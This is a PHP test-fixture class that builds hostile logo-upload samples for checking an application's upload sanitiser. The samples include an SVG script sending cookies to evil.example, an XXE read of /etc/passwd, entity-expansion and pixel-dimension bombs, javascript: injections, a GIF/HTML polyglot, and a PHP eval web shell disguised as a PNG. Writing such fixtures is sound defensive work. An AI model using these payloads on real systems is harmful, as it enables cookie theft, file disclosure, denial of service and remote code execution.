<?php

// SPDX-FileCopyrightText: 2026 The DocUp contributors
// SPDX-License-Identifier: Apache-2.0

declare(strict_types=1);

namespace Tests\Support;

/**
 * The §9.4 abuse-corpus fixtures for Phase 27's `branding` category.
 *
 * 🛑 **PHP, not Python**, and the corpus README records why about the archive
 * builders: "neither the application container nor CI has a Python
 * interpreter, so a corpus that depended on it would have been a corpus that
 * never ran". Same rule here.
 *
 * 🛑 **One method per `builder` name in `corpus.json`**, resolved by
 * {@see self::build()} — which **fails loudly** when a case names a builder
 * that does not exist. A case without a fixture stops running while the suite
 * still reports green, which is the failure mode the archive builders were
 * written to avoid.
 */
final class BrandingHostiles
{
    /**
     * One fixture by name.
     *
     * @throws \RuntimeException when the corpus names a builder that is absent
     */
    public static function build(string $builder): string
    {
        return match ($builder) {
            'script' => self::script(),
            'onload' => self::onload(),
            'doctype_xxe' => self::doctypeXxe(),
            'entity_expansion' => self::entityExpansion(),
            'foreign_object' => self::foreignObject(),
            'use_external' => self::useExternal(),
            'animate_href' => self::animateHref(),
            'style_url' => self::styleUrl(),
            'html_root' => self::htmlRoot(),
            'gif_html_polyglot' => self::gifHtmlPolyglot(),
            'pixel_bomb' => self::pixelBomb(),
            'php_as_png' => self::phpAsPng(),
            'svg_script' => self::script(),
            default => throw new \RuntimeException('no branding fixture builder named "'.$builder.'"'),
        };
    }

    /** `branding-023`: a script element inside an SVG logo. */
    private static function script(): string
    {
        return self::svg(
            '<title>ACME</title>'
            .'<script type="text/javascript">fetch("https://evil.example/?c="+document.cookie)</script>'
            .'<rect width="64" height="64" fill="#0b5cd5"/>',
        );
    }

    /** `branding-024`: an event handler, which is a script with no syntax. */
    private static function onload(): string
    {
        return self::svg('<rect width="64" height="64" fill="#0b5cd5" onload="alert(1)"/>');
    }

    /**
     * `branding-025`: the classic XXE. A DOCTYPE declaring a `SYSTEM` entity
     * that reads a local file, referenced from the document body.
     */
    private static function doctypeXxe(): string
    {
        return '<?xml version="1.0" encoding="UTF-8"?>'."\n"
            .'<!DOCTYPE svg [<!ENTITY leak SYSTEM "file:///etc/passwd">]>'."\n"
            .'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">'
            .'<title>&leak;</title><rect width="64" height="64"/></svg>';
    }

    /**
     * `branding-026`: entity expansion with **no external entity**, which a
     * network-level defence does not see at all.
     */
    private static function entityExpansion(): string
    {
        return '<?xml version="1.0" encoding="UTF-8"?>'."\n"
            .'<!DOCTYPE svg ['
            .'<!ENTITY a "aaaaaaaaaa">'
            .'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
            .'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">'
            .'<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">'
            .']>'."\n"
            .'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><title>&d;</title></svg>';
    }

    /** `branding-027`: an escape hatch from SVG into HTML. */
    private static function foreignObject(): string
    {
        return self::svg(
            '<foreignObject width="64" height="64">'
            .'<div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div>'
            .'</foreignObject>'
            .'<rect width="64" height="64" fill="#0b5cd5"/>',
        );
    }

    /** `branding-028`: `<use href>` naming another document, not a fragment. */
    private static function useExternal(): string
    {
        return self::svg(
            '<use href="https://evil.example/symbols.svg#logo"/>'
            .'<rect width="64" height="64" fill="#0b5cd5"/>',
        );
    }

    /**
     * `branding-029`: SMIL animation writing an attribute the allowlist
     * refused. `attributeName` is the vector.
     */
    private static function animateHref(): string
    {
        return self::svg(
            '<rect width="64" height="64" fill="#0b5cd5">'
            .'<animate attributeName="href" to="javascript:alert(1)" dur="1s"/>'
            .'</rect>',
        );
    }

    /** `branding-030`: a `style` attribute carrying a remote `url()`. */
    private static function styleUrl(): string
    {
        return self::svg(
            '<rect width="64" height="64" style="fill:#0b5cd5;background:url(https://evil.example/t.png)"/>',
        );
    }

    /** `branding-031`: an HTML document that sniffs as XML. */
    private static function htmlRoot(): string
    {
        return '<?xml version="1.0" encoding="UTF-8"?>'."\n"
            .'<html xmlns="http://www.w3.org/1999/xhtml"><body>'
            .'<svg xmlns="http://www.w3.org/2000/svg"><rect width="8" height="8"/></svg>'
            .'</body></html>';
    }

    /**
     * `branding-032`: a valid GIF whose bytes continue into an HTML document.
     *
     * 🛑 An image sniffer calls this a GIF and a content-sniffing browser may
     * call it a document. §8.14.11's re-encode is what makes both answers
     * irrelevant: the stored bytes are a PNG DocUp wrote from pixels.
     */
    private static function gifHtmlPolyglot(): string
    {
        return self::gif(4, 4)."\n<html><script>alert(document.domain)</script></html>";
    }

    /**
     * `branding-033`: a few dozen bytes declaring 20,000 × 20,000 pixels.
     *
     * 🛑 Written by hand, because no encoder will produce a file that is tiny
     * on disk and enormous in its header — which is exactly what a
     * decompression bomb is.
     */
    private static function pixelBomb(): string
    {
        return self::gif(20_000, 20_000);
    }

    /** `branding-034`: a PHP file whose name and claimed type say PNG. */
    private static function phpAsPng(): string
    {
        return "<?php @eval(\$_GET['c']); // uploaded as logo.png\n";
    }

    /** An SVG document around a body, with the namespace and a viewBox. */
    private static function svg(string $body): string
    {
        return '<?xml version="1.0" encoding="UTF-8"?>'."\n"
            .'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 64 64">'
            .$body
            .'</svg>';
    }

    /**
     * A GIF whose **header** declares `$width` × `$height`.
     *
     * The image data is a single one-pixel LZW block, so the file stays under
     * a kilobyte whatever the header claims — and `getimagesizefromstring()`
     * reports the declared size, because that is where the size lives.
     */
    private static function gif(int $width, int $height): string
    {
        $gif = 'GIF89a';
        $gif .= pack('vv', $width, $height);
        /* One bit of colour resolution, a two-entry global colour table. */
        $gif .= "\x80\x00\x00";
        $gif .= "\x00\x00\x00";   // black
        $gif .= "\xff\xff\xff";   // white
        /* Image descriptor: one pixel at the origin, no local table. */
        $gif .= "\x2c".pack('vvvv', 0, 0, 1, 1)."\x00";
        /* LZW minimum code size 2, one data block, a clear and an end code. */
        $gif .= "\x02\x02\x4c\x01\x00";

        return $gif."\x3b";
    }
}
